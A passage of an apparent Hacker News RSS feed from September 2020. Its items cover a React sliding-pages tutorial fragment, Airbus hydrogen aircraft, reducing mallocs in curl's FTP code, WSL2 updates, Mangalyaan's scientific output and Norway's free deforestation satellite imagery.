<span>export</span> <span>default</span> <span>Link</span>;

</code></pre></div><p>This component is pretty straight forward, it renders the component's children and changes the hash on a click according to the <strong>to</strong> prop.</p>
<p>Let's make our Nav component react to hash changes.</p>
<p><strong>nav.js</strong></p>
<div><pre><code data-lang="javascript">...

    <span>constructor</span>(<span>props</span>) {
        <span>super</span>(<span>props</span>);
        <span>this</span>.<span>width</span> <span>=</span> window.<span>innerWidth</span> <span>||</span> document.<span>documentElement</span>.<span>clientWidth</span> <span>||</span> document.<span>body</span>.<span>clientWidth</span>;
        <span>let</span> <span>left</span> <span>=</span> <span>props</span>.<span>children</span>.<span>map</span>(<span>o</span> =&gt; <span>this</span>.<span>width</span>);
        <span>if</span> (<span>left</span>.<span>length</span> <span>&gt;</span> <span>0</span> ) {
            <span>left</span>[<span>0</span>] <span>=</span> <span>0</span>;
        }
        <span>this</span>.<span>state</span> <span>=</span> {<span>page</span><span>:</span> <span>0</span>, <span>left</span><span>:</span> <span>left</span>, <span>from</span><span>:</span> <span>left</span>};
        <span>this</span>.<span>pages</span> <span>=</span> {};
    }

...

    <span>componentDidMoun‚Ä¶</span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.turtle-techies.com/sliding-pages-with-react-js/">https://www.turtle-techies.com/sliding-pages-with-react-js/</a></em></p>]]>
            </description>
            <link>https://www.turtle-techies.com/sliding-pages-with-react-js/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577233</guid>
            <pubDate>Thu, 24 Sep 2020 10:42:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Airbus to launch hydrogen-powered commercial aircraft by 2035]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577226">thread link</a>) | @artagnon
<br/>
September 24, 2020 | https://www.rfi.fr/en/france/20200921-airbus-to-launch-hydrogen-powered-commercial-aircraft-by-2035 | <a href="https://web.archive.org/web/*/https://www.rfi.fr/en/france/20200921-airbus-to-launch-hydrogen-powered-commercial-aircraft-by-2035">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
                    Airbus has announced its aim to put the world's first hydrogen-powered commercial aircraft into service by 2035.
                </p><div>
                    
                                        <p>"This is a historic moment for the commercial aviation sector as a whole and we intend to play a leading role in the most important transition this industry has ever seen,"&nbsp;Guillaume Faury, Airbus CEO said.</p><p>"The concepts we unveil today offer the world a glimpse of our ambition to drive a bold vision for the future of zero-emission flight."</p><p>Airbus‚Äô hydrogen technology will be demonstrated in three concept aircrafts called Zeroe: a turboprop (up to 100 passengers), a turbo fan (100 to 200 passengers) and a blended wing body (up to 200 passengers).</p><p>Speaking in a web telecast, Grazia Vittadini, chief technology officer of Airbus, explained the reason behind the choice of hydrogen for the zero emissions program.</p><p><strong>Hydrogen's flexibility</strong></p><p>‚ÄúHydrogen can be combusted directly through modified gas turbines. It can also be converted into electric energy thanks to fuel cells and when combined with CO2 hydrogen can be used to produce synthetic kerosene,‚Äù she said.</p><p>She added Airbus would&nbsp;focus on combining the first two elements.</p>                
    <p>‚ÄúThis means having direct combustion of hydrogen through modified gas turbines with an embedded electric motor powered by fuel cells.‚Äù</p><p>She also listed hydrogen‚Äôs other key advantage. ‚ÄúHydrogen has the same energy level as kerosene that enables it to deliver same kind of range and performance with one third of the weight.‚Äù</p><p>She remarked that the first flight demonstrator of a hydrogen aircraft is expected to be in 2025.</p><p>The French government has earmarked 1.5 billion euros for the development of carbon-free aircraft as part of a support plan for the aviation sector, with other European countries&nbsp;supporting the growth of &nbsp;hydrogen technology.</p>
                                            
    
                </div></div>]]>
            </description>
            <link>https://www.rfi.fr/en/france/20200921-airbus-to-launch-hydrogen-powered-commercial-aircraft-by-2035</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577226</guid>
            <pubDate>Thu, 24 Sep 2020 10:42:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reducing mallocs for fun]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577129">thread link</a>) | @headalgorithm
<br/>
September 24, 2020 | https://daniel.haxx.se/blog/2020/09/24/reducing-mallocs-for-fun/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2020/09/24/reducing-mallocs-for-fun/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Everyone needs something fun to do in their spare time. And digging deep into curl internals is mighty fun!</p>



<p>One of the things I do in curl every now and then is to run a few typical command lines and count how much memory is allocated and how many memory allocation calls that are made. This is good project hygiene and is a basic check that we didn‚Äôt accidentally slip in a malloc/free sequence in the transfer path or something.</p>



<p>We have extensive memory checks for leaks etc in the test suite so I‚Äôm not worried about that. Those things we detect and fix immediately, even when the leaks occur in error paths ‚Äì thanks to our fancy ‚Äútorture tests‚Äù that do error injections.</p>



<p>The amount of memory needed or number of mallocs used is more of a <a href="https://en.wikipedia.org/wiki/Boiling_frog">boiling frog problem</a>. We add one now, then another months later and a third the following year. Each added malloc call is motivated within the scope of that particular change. But taken all together, does the pattern of memory use make sense? Can we make it better?</p>



<h2>How?</h2>



<p>Now this is easy because when we build curl debug enabled, we have a fancy logging system (we call it <em>memdebug</em>) that logs all calls to ‚Äúfallible‚Äù system functions so after the test is completed we can just easily grep for them and count. It also logs the exact source code and line number.</p>



<pre>cd tests
./runtests -n [number]
egrep -c 'alloc|strdup' log/memdump</pre>



<h2>Let‚Äôs start</h2>



<p>Let me start out with a look at the history and how many allocations (calloc, malloc, realloc or strdup) we do to complete test 103. The reason I picked 103 is somewhat random, but I wanted to look at FTP and this test happens to do an ‚Äúactive‚Äù transfer of content and makes a total of 10 FTP commands in the process.</p>



<p>The reason I decided to take a closer look at FTP this time is because I fixed an issue in the main ftp source code file the other day and that made me remember the <code>Curl_pp_send()</code> function we have. It is the function that sends FTP commands (and IMAP, SMTP and POP3 commands too, the family of protocols we refer to as the ‚Äúping pong protocols‚Äù internally because of their command-response nature and that‚Äôs why it has ‚Äúpp‚Äù in the name).</p>



<p>When I reviewed the function now with my malloc police hat on, I noticed how it made two calls to aprintf(). Our printf version that returns a freshly malloced area ‚Äì which can even cause several reallocs in the worst case. But this meant <em>at least </em>two mallocs per issued command. That‚Äôs a bit unnecessary, isn‚Äôt it?</p>



<h2>What about a few older versions</h2>



<p>I picked a few random older versions, checked them out from git, built them and counted the number of allocs they did for test 103:</p>



<pre>7.52.1: 141<br>7.68.0: 134<br>7.70.0: 137<br>7.72.0: 123</pre>



<p>It‚Äôs been up but it has gone down too. Nothing alarming, Is that a good amount or a bad amount? We shall see‚Ä¶</p>



<h2>Cleanup step one</h2>



<p>The function gets printf style arguments and sends them to the server. The sent command also needs to append CRLF to the data. It was easy to make sure the CRLF appending wouldn‚Äôt need an extra malloc. That was just sloppy of us to have there in the first place. Instead of mallocing the new printf format string with CRLF appended, it could use one in a stack based buffer. I landed that as a <a href="https://github.com/curl/curl/commit/0548ecaf6ac6fd8d81d63048d09ece8dbb715666">first commit</a>.</p>



<p>This trimmed off 10 mallocs for test 103.</p>



<h2>Step two, bump it up a notch</h2>



<p>The remaining malloc allocated the memory block for protocol content to send. It can be up to several kilobytes but is usually just a few bytes. It gets allocated in case it needs to be held on to if the entire thing cannot be sent off over the wire immediately. Remember, curl is non-blocking internally so it cannot just sit waiting for the data to get transferred.</p>



<p>I switched the malloc‚Äôed buffer to instead use a ‚Äòdynbuf‚Äô. That‚Äôs our internal ‚Äúdynamic buffer‚Äù system that was <a href="https://github.com/curl/curl/commit/ed35d6590e72c23c568af1e3b8ac6e4e2d883888#diff-8990ac09ce8abcb4f5e90a8f210ae11c">introduced earlier this year</a> and that we‚Äôre gradually switching all internals over to use instead of doing ‚Äúcustom‚Äù buffer management in various places. <a href="https://github.com/curl/curl/blob/master/docs/DYNBUF.md">The internal API for dynbuf is documented here</a>.</p>



<p>The internal API <code>Curl_dyn_addf()</code> adds a printf()-style string at the end of a ‚Äúdynbuf‚Äù, and it seemed perfectly suitable to use here. I only needed to provide a <code>vprintf()</code> alternative since the printf() format was already received by <code>Curl_pp_sendf()</code>‚Ä¶ I created <code>Curl_dyn_vaddf()</code> for this.</p>



<p>This single dynbuf is kept for the entire transfer so that it can be reused for subsequent commands and grow only if needed. Usually the initial 32 bytes malloc should be sufficient for all commands.</p>



<h2>Not good enough</h2>



<p>It didn‚Äôt help!</p>



<p>Counting the mallocs showed me with brutal clarity that my job wasn‚Äôt done there. Having dug this deep already I wasn‚Äôt ready to give this up just yet‚Ä¶</p>



<p>Why? Because <code>Curl_dyn_addf()</code> was still doing a separate alloc of the printf string that it then appended to the dynamic buffer. But okay, having <a href="https://github.com/curl/curl/blob/master/lib/mprintf.c">our own printf() implementation</a> in the code has its perks.</p>



<h2>Add a printf() string without extra malloc</h2>



<p>Back in <a href="https://github.com/curl/curl/commit/ed35d6590e72c23c568af1e3b8ac6e4e2d883888#diff-8990ac09ce8abcb4f5e90a8f210ae11c">May 2020</a> when I introduced this dynbuf thing, I converted the aprintf() code over to use dynbuf to truly unify our use of dynamically growing buffers. That was a main point with it after all.</p>



<p>As all the separate individual pieces I needed for this next step were already there, all I had to do was to add a new entry point to the printf() code that would accept a dynbuf as input and write directly into that (and grow it if needed), and then use that new function (<code>Curl_dyn_vprintf</code>) from the Curl_dyn_addf().</p>



<p>Phew. Now let‚Äôs see what we get‚Ä¶</p>



<p>There are 10 FTP commands that previously did 2 mallocs each: 20 mallocs were spent  in this function when test 103 was executed. Now we are down to the ideal case of one alloc in there for the entire transfer.</p>



<h2>Test 103 after polish</h2>



<p>The code right now in master (to eventually get released as 7.73.0 in a few weeks), now shows <strong>a total of 104 allocations</strong>. Down from 123 in the previous release, which not entirely surprising is 19 fewer and thus perfectly matching the logic above.</p>



<p>All tests and CI ran fine. <a href="https://github.com/curl/curl/commit/675eeb1c941706070381faaad8ee1a5d75cff4a4">I merged it</a>. This is a change that benefits all transfers done with any of the ‚Äúping pong protocols‚Äù. And it also makes the code easier to understand!</p>



<p>Compared to curl 7.52.1, this is a 26% reduction in number of allocation; pretty good, but even compared to 7.72.0 it is still a 15% reduction.</p>



<h2>More?</h2>



<p>There is always more to do, but there‚Äôs also a question of diminishing returns. I will continue to look at curl‚Äôs memory use going forward too and make sure everything is motivated and reasonable. At least every once in a while.</p>



<p>I have some additional ideas for further improvements in the memory use area to look into. We‚Äôll see if they pan out‚Ä¶</p>



<p>Don‚Äôt count on me to blog about every such finding with this level of detail! If you want to make sure you don‚Äôt miss any of these fine-tunes in the future, follow <a href="https://github.com/curl/curl">the curl github repo</a>.</p>



<h2>Credits</h2>



<p>Image by <a href="https://pixabay.com/users/orzalaga-77630/?utm_source=link-attribution&amp;utm_medium=referral&amp;utm_campaign=image&amp;utm_content=1837434">Julio C√©sar Vel√°squez Mej√≠a</a> from <a href="https://pixabay.com/?utm_source=link-attribution&amp;utm_medium=referral&amp;utm_campaign=image&amp;utm_content=1837434">Pixabay</a></p>
	</div></div>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2020/09/24/reducing-mallocs-for-fun/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577129</guid>
            <pubDate>Thu, 24 Sep 2020 10:22:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Microsoft Windows 10 WSL2 to have GUI app support, automatic Linux Kernel update]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577045">thread link</a>) | @vvpvijay
<br/>
September 24, 2020 | https://androidrookies.com/microsoft-windows-10-wsl2-update-comes-with-gui-app-support-automatic-linux-kernel-update/ | <a href="https://web.archive.org/web/*/https://androidrookies.com/microsoft-windows-10-wsl2-update-comes-with-gui-app-support-automatic-linux-kernel-update/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-11055"><div><div><div><h2>You can soon run Windows Subsystem for Linux 2 on your Windows 10 1903 and 1909 version; WSL 2 update to bring Linux GUI App support and automatic Linux Kernel update</h2><p>In your next Windows 10 update, you can run any Linux apps in WSL2 in their own dedicated UI thus making you feel you are on a Linux laptop. This is not all, Microsoft will be pushing WSL 2 to Windows 10 1903 and 1909 version laptops, PCs, and servers. This means that all Windows 10 users irrespective of their version will be able to run WSL2 on their laptops, PCs, and servers.</p><p>These are some of the announcements <a href="https://devblogs.microsoft.com/commandline/whats-new-in-the-windows-subsystem-for-linux-september-2020/">Microsoft</a> has made to make Windows Subsystem for Linux 2 a very important subset of Windows 10 operating system. Microsoft had originally announced many features in WSL 2 during the Build developer conference earlier this year.</p><p>Microsoft blog says that now WSL 2 will be available for all Windows 10 versions. The WSL 2 was first released through the May 2020 Windows update called Windows 10 version 2004. Now WSL 2 will be available for Windows 10 version 1903 and 1909 in the coming weeks.</p><p>‚ÄúWe‚Äôve heard feedback on how many users have enjoyed using WSL 2 and have made WSL 2 available to more Windows users with this backport. Customers running Windows 10 version 1903 and 1909 can now enjoy faster file system performance, 100% system call compatibility, and be able to use Docker Desktop with the WSL2-based engine,‚Äù Craig Loewen, Program Manager, Windows Developer Platform, explains.</p><p>In the Build conference, Microsoft had also announced native GUI app support for WSL2. Loewen says that this feature will now be released through an update to all Windows 10 users. After the update, you will be&nbsp;able to run Linux apps in WSL2 in their own dedicated UI. This will give users the feel of actually being on a Linux run PC or laptop.</p><p>‚ÄúWSL will support many different types of applications, including IDEs running fully in a Linux environment. We have included lots of fit and finish details, such as showing the icons for Linux apps in the taskbar and support for audio with your microphone,‚Äù Loewen notes.</p><p>Another feature coming through a Windows 10 update is support for the wsl ‚Äìinstall command in WSL2. This feature was also announced at the Build developer conference this year and allows Windows 10 users to fully install WSL2 and Linux distro of their choice using the SUDO command.</p><p>Another big change coming to Windows 10 WSL 2 is automatic Linux Kernel update. Once update with the new patches, Windows 10 users will no longer concerned about updating Linux Kernel to keep up with Linux Foundation‚Äôs security fixes. This feature which was announced in the Microsoft Build conference will now be live for everybody, so in the future Linux kernel versions will be updated automatically just like the Windows operating system in the first place.</p><p>‚ÄúYou can have greater control over your Linux kernel version, as well as your Windows version, enabling you to stay safe and secure as Windows keeps you up to date. The new kernel versions are no longer only for Windows Insiders, now any device that has WSL enabled and has opted into Microsoft Updates will automatically receive the latest kernel version!‚Äù Loewen continues.</p><p>Loewen says that the above features will be released to Windows 10 users in a phased manner. So keep updating your Windows 10 to get the latest WSL 2 features from Microsoft.</p></div></div></div></article></div>]]>
            </description>
            <link>https://androidrookies.com/microsoft-windows-10-wsl2-update-comes-with-gui-app-support-automatic-linux-kernel-update/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577045</guid>
            <pubDate>Thu, 24 Sep 2020 10:06:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[India‚Äôs Mars orbiter completes 6 years at the red planet. Where is the science?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24576962">thread link</a>) | @uncertainquark
<br/>
September 24, 2020 | https://jatan.space/missing-science-from-mangalyaan/ | <a href="https://web.archive.org/web/*/https://jatan.space/missing-science-from-mangalyaan/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div><figure><img loading="lazy" width="817" height="543" src="https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-cover.jpg?resize=817%2C543&amp;ssl=1" alt="" srcset="https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-cover.jpg?w=817&amp;ssl=1 817w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-cover.jpg?resize=200%2C133&amp;ssl=1 200w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-cover.jpg?resize=768%2C510&amp;ssl=1 768w" sizes="(max-width: 817px) 100vw, 817px" data-recalc-dims="1"><figcaption>Artist‚Äôs impression of the Mangalyaan spacecraft. Credit: ISRO</figcaption></figure></div>



<p>This September 24 marks six years since ISRO‚Äôs Mangalyaan spacecraft entered Mars orbit, making India the first Asian country to do so. What is even more impressive is that Mangalyaan was the country‚Äôs first interplanetary mission. Combined with the cost effectiveness for which it is lauded, Mangalyaan is often hailed as India‚Äôs most successful space mission. But is it?</p>



<h3><strong>Mangalyaan‚Äôs missing Science</strong></h3>



<p>The Indian Prime Minister, Narendra Modi, has <a href="https://www.hindustantimes.com/india/modi-steals-the-show-with-mom-speech/story-InpN3lWUPODF6OURjabTgJ.html">boasted</a> that at ~$70 million, the mission was cheaper than the Hollywood film <em>Gravity</em>, and even an <em>auto rickshaw</em> (taxi-equivalent) ride on a fare-per-kilometer basis. The media highlighted Mangalyaan‚Äôs cost effectiveness too, noting that NASA‚Äôs MAVEN orbiter to Mars, launched around the same time, had cost about seven times more.</p>



<p>India‚Äôs pride in the mission while downplaying others has continued to spread over the years, also taking the form of dramatized movies like <a href="https://www.imdb.com/title/tt9248972/">Mission Mangal</a>. But what they all miss is looking at the science output i.e. what has Mangalyaan been doing in Mars orbit?</p>



<p>According to ISRO‚Äôs official <a href="https://www.isro.gov.in/sites/default/files/mom-list-of-publications-sept2019.pdf">list of publications</a>, there have been only 27 peer-reviewed papers relating to Mangalyaan, after six years in orbit. In contrast, MAVEN has helped produce many <a href="https://jatan.space/nasa-maven-mars-orbiter/">seminal scientific results</a> about the martian atmosphere, with a repository of <a href="https://ui.adsabs.harvard.edu/search/q=((MAVEN%20spacecraft)%20AND%20year%3A2012-2021)%20full%3A%22mars%22&amp;sort=date%20desc%2C%20bibcode%20desc&amp;p_=0">at least 500</a> papers and growing. What‚Äôs more concerning about Mangalyaan‚Äôs short publications list is that about half of those are simply engineering descriptions of the mission, not scientific results <em>from</em> the mission.</p>



<p>Naysayers may dismiss the lack of science by arguing that Mangalyaan was a ‚Äòtechnology demonstration‚Äô mission, aimed at proving ISRO‚Äôs interplanetary mission capabilities. That may be part of it but that‚Äôs not how ISRO marketed the mission pre and post launch, when it was vocal about the science goals.</p>



<p>ISRO has made data from Mangalyaan‚Äôs five indigenous <a href="https://www.isro.gov.in/announcement-of-opportunity-utilising-mars-orbiter-mission-data-mcc-tis-msm-lap-and-menca-payloads-1">science instruments</a> available on their <a href="https://mrbrowse.issdc.gov.in/MOMLTA/">data portal</a> for five years now, and has <a href="https://www.isro.gov.in/pslv-c25-mars-orbiter-mission/announcement-of-opportunity-utilising-mars-orbiter-mission-data-mcc">explicitly welcomed</a> the Indian science community to publish papers. In 2017, ISRO <a href="https://www.isro.gov.in/mom-science-meet">announced</a> at the mission‚Äôs dedicated science meet that 32 research teams across the country are exploring and analyzing Mangalyaan data. And yet, there is a huge vacuum of publications.</p>







<p>Perhaps the most notable failure concerns the much-hyped methane sensor. The instrument was supposed to globally map methane with a sensitivity of parts per billion, to help decide if the methane on Mars could be a sign of subsurface life. But two years after launch, the instrument was found to <a href="https://www.seeker.com/india-mars-orbiter-mission-methane-detector-flaw-red-planet-2133861312.html">have a design flaw</a> and so it can‚Äôt detect methane at all. At that point, ISRO repurposed the methane sensor as an albedo mapper, which measures sunlight reflected from the surface to get hints about Mars‚Äô surface composition.</p>



<p>There also seem to be no published results from the Lyman Alpha Photometer. By looking for hydrogen escaping Mars‚Äô atmosphere, it was supposed to tell us how much water Mars lost since its birth and at what rate. Notably, NASA‚Äôs MAVEN spacecraft was also expected to deliver this result (by examining many more factors), and <a href="https://jatan.space/nasa-maven-mars-orbiter/">it delivered</a>.</p>



<h3><strong>The urge to be first</strong></h3>



<p>If the cost argument is to be made to justify some or any part of the missing science, ISRO‚Äôs own Chandrayaan 1 refutes it. At $54 million, it was cost effective too, and an equally challenging endeavor given that it was India‚Äôs first lunar orbiter.</p>



<p>Unlike Mangalyaan though, Chandrayaan 1 welcomed global collaboration ‚Äì&nbsp;about half the instruments came from foreign space agencies and universities. Notably, it was the two NASA instruments that confirmed the <a href="https://jatan.space/how-nasa-and-chandrayaan-discovered-water-on-the-moon/">discovery of water on the Moon</a>. Despite orbiting the Moon for less than a year, Chandrayaan 1 produced hundreds of publications and scientists are analyzing its data even today.</p>



<p>This is not to say that ISRO can‚Äôt build good science instruments but to point out that collaboration can be an effective way to increase mission science without increasing mission cost. For some reason, ISRO doesn‚Äôt even fly science instruments from universities and institutions within the country for its planetary missions. The only exception has been India‚Äôs first space telescope Astrosat whose instruments were selected as a consensus from academic institutions across the country. But that‚Äôs not planetary exploration per se, for which ISRO operates differently. ISRO does <a href="https://jatan.space/isro-welcomes-academia-companies-in-space-exploration-plans/">intend to change this method in the future</a> as part of its space commercialization initiative by involving private players and academic institutions.</p>



<p>Both the missing collaborations and lack of scientific output from Mangalyaan‚Äôs indigenous instruments may have to do with the mission‚Äôs development time, which was just 18 months. It‚Äôs unclear why ISRO was in such a hurry to launch in 2013 and couldn‚Äôt have targeted the 2016 launch opportunity instead. The reason may be political ‚Äì&nbsp;the urge to successfully orbit Mars before China or Japan does.</p>



<div><figure><img loading="lazy" width="1024" height="723" src="https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-launch.jpg?resize=1024%2C723&amp;ssl=1" alt="" srcset="https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-launch.jpg?resize=1024%2C723&amp;ssl=1 1024w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-launch.jpg?resize=200%2C141&amp;ssl=1 200w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-launch.jpg?resize=768%2C543&amp;ssl=1 768w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-launch.jpg?resize=1536%2C1085&amp;ssl=1 1536w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-launch.jpg?resize=1200%2C848&amp;ssl=1 1200w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-launch.jpg?w=1594&amp;ssl=1 1594w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1"><figcaption>Launch of Mangalyaan onboard a PSLV rocket on November 5, 2013. <a href="https://www.isro.gov.in/pslv-c25-mars-orbiter-mission/pslv-c25-mars-orbiter-mission-gallery">Credit: ISRO</a></figcaption></figure></div>



<p>Had Mangalyaan been given enough time, the scientific instruments package likely wouldn‚Äôt have been restricted to the mere 15 kilograms, and the output could‚Äôve been substantial even with indigenous instruments. Case in point being ISRO‚Äôs Chandrayaan 2 orbiter which carries state-of-the-art instruments, all indigenous, and is <a href="https://jatan.space/chandrayaan-2-is-creating-the-highest-resolution-map-of-the-moon/">making the highest-resolution map</a> of the Moon and quantifying water on its poles as we speak.</p>



<p>Another way Mangalyaan‚Äôs value could‚Äôve been improved was if ISRO equipped it with a standard relay device, one that every NASA Mars orbiter carries. These orbiter relays allow NASA to get more science data from its surface missions than would be possible otherwise. The European Space Agency <a href="https://mars.nasa.gov/news/nasa-radio-delivered-for-europes-2016-mars-orbiter/">put one such device</a> for NASA on their Trace Gas Orbiter, launched in 2016. If ISRO had done that too, instead of <a href="https://twitter.com/MarsOrbiter/status/514618412417302528">talking to NASA‚Äôs Curiosity on Twitter</a>, Mangalyaan could‚Äôve talked to the real deal.</p>



<h3><strong>Missing space exploration roadmap</strong></h3>



<p>More than the quality of the science instruments or mission planning, Mangalyaan highlights the lack of an overarching philosophy guiding India‚Äôs planetary missions.<strong> </strong>In contrast, NASA has an elaborate process called <a href="https://www.nationalacademies.org/our-work/planetary-science-and-astrobiology-decadal-survey-2023-2032">the Decadal Survey</a> in which scientists from across the US present a consensus of prioritized space exploration destinations and scientific objectives once every decade. NASA uses the Decadal as a guide to build its missions, and the system therefore guarantees that said scientific goals are achieved more often than not. China and the European Space Agency have similar processes in place for their missions.</p>



<p>Space exploration missions are inherently costly undertakings, and at this point, the value per unit money matters as much as the absolute cost, if not more. MAVEN highlights this adequately. The mission, part of NASA‚Äôs larger Mars exploration program, is built with the express purpose of studying Mars‚Äô atmosphere and determining exactly how the red planet lost its water. Thanks to its clear objectives, MAVEN delivered big science&nbsp;while still costing NASA less than many of its other endeavors, even if costing more than Mangalyaan.</p>



<p>Like NASA‚Äôs other missions, MAVEN‚Äôs findings feed directly into the agency‚Äôs next steps in Mars exploration and planning of future habitats, further cementing the value-proposition of such a model. India could benefit immensely from a formal planetary exploration framework which either doesn‚Äôt exist or whose functioning is inept and unclear to the public.</p>



<p>ISRO plans to launch Mangalyaan 2 in 2024 with an upgraded orbiter, with a capacity of 100 kilograms for scientific instruments. The mission could also include a lander and a rover but it seems unlikely at the moment. Notably, Mangalyaan 2 will launch after the first Mars rover missions from China and the European Space Agency, and alongside NASA‚Äôs ever present Mars fleet. Let us hope Mangalyaan 2 is an appropriate step forward in this journey.</p>



<div><figure><img loading="lazy" width="1200" height="1200" src="https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=1200%2C1200&amp;ssl=1" alt="" srcset="https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?w=2048&amp;ssl=1 2048w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=1024%2C1024&amp;ssl=1 1024w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=200%2C200&amp;ssl=1 200w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=768%2C768&amp;ssl=1 768w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=1536%2C1536&amp;ssl=1 1536w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=1200%2C1200&amp;ssl=1 1200w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=800%2C800&amp;ssl=1 800w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=400%2C400&amp;ssl=1 400w" sizes="(max-width: 1200px) 100vw, 1200px" data-recalc-dims="1"><figcaption>Global view of Mars from the Mangalyaan spacecraft, taken on October 4, 2014, from an altitude of 76,680 kilometers.<em>&nbsp;</em>Credit: ISRO / Emily Lakdawalla, released under <a href="https://creativecommons.org/licenses/by-nc-nd/3.0/">CC BY-NC-ND 3.0</a>.</figcaption></figure></div>



<blockquote><p>I could write this article because of the support of my readers on <a href="https://www.patreon.com/uncertainquark">Patreon</a>. I don‚Äôt display ads on my blog so if you like my work, consider&nbsp;<a href="https://www.patreon.com/uncertainquark">supporting me</a> and get benefits in return.&nbsp;üöÄ</p></blockquote>



<hr>



<p><em><a href="https://science.thewire.in/space/isros-mangalyaan-orbiter-completes-six-years-around-mars-wheres-the-science/">Republished</a> by The Wire Science.</em></p>



<pre>On a related note, I was invited as a guest on the NewSpace India podcast led by <a href="https://twitter.com/cosmosguru/">Narayan Prasad</a>, a space entrepreneur and industry expert, to <a href="https://share.transistor.fm/s/b5cea33e">talk about Mangalyaan and India's space exploration missions</a>.</pre>

</div></div>]]>
            </description>
            <link>https://jatan.space/missing-science-from-mangalyaan/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24576962</guid>
            <pubDate>Thu, 24 Sep 2020 09:50:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[New satellite images to allow anyone to monitor tropical deforestation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24576847">thread link</a>) | @dcustodio
<br/>
September 24, 2020 | https://www.nicfi.no/current/new-satellite-images-to-allow-anyone-anywhere-to-monitor-tropical-deforestation/ | <a href="https://web.archive.org/web/*/https://www.nicfi.no/current/new-satellite-images-to-allow-anyone-anywhere-to-monitor-tropical-deforestation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>‚ÄúThis will revolutionize global forest monitoring. Better insight into what is happening in the rainforests will enhance efforts to protect these priceless ecosystems‚Äù, says Sveinung Rotevatn, Norway‚Äôs Minister of Climate and Environment.</p>

<h2><strong>Better information saves rainforests</strong></h2>
<p>Satellite images are available that are so detailed that one can see if a single tree has been cut down. However, such images are very expensive, and only a few private stakeholders have access to them. Through <a href="https://www.nicfi.no/">Norway‚Äôs International Climate and Forest Initiative (NICFI)</a>, the Government of Norway is now making the images accessible and free for everyone.</p>
<p>The high-resolution satellite images provide an overview of all the tropical forests around the world, and these images will be updated every month. Users can access image archives that include data dating back to 2015. This allows users to see the development that has taken place in the forests over several years.</p>
<p>‚ÄúSmall communities can now be seen and heard in their struggle with companies that steal their rightful territories. The world‚Äôs supermarkets can monitor claims made by their suppliers regarding the sustainable production of soy, palm oil and other raw materials‚Äù, says Rotevatn.</p>
<p><em>&nbsp;</em>The images will be free of charge. Anyone around the world can detect deforestation occurring in very small areas, whether it be authorities, companies buying raw materials associated with deforestation, investors, journalists, scientists, indigenous organizations or NGOs.</p>
<h2><strong>Powerful tool for indigenous people.</strong></h2>
<p>Not least, information from satellite images is important for indigenous organizations. The indigenous leader Ianukul√° Kaiabi Sui√°, from the <em>Associa√ß√£o Terra Ind√≠gena do Xingu</em> (ATIX), has high expectations for the new satellite images. He represents the indigenous territory of S√£o F√©lix do Xingu in Brazil, one of the most vulnerable areas in the Amazon.</p>
<p>‚ÄúSatellite image is a powerful tool since it is better understood by indigenous communities compared to data sources from numbers. These images will give the communities a better understanding of the problems‚Äô location and dimension, so that their actions can be better planned‚Äù, says Ianukul√° Kaiabi Sui√°</p>
<p>Colombia‚Äôs Minister of the Environment and Sustainable Development, Ricardo Jos√© Lozano Pic√≥n, points out that Colombia over the last years has developed an advanced monitoring system, but that a bottleneck has been that high-resolution satellite images are very expensive.</p>
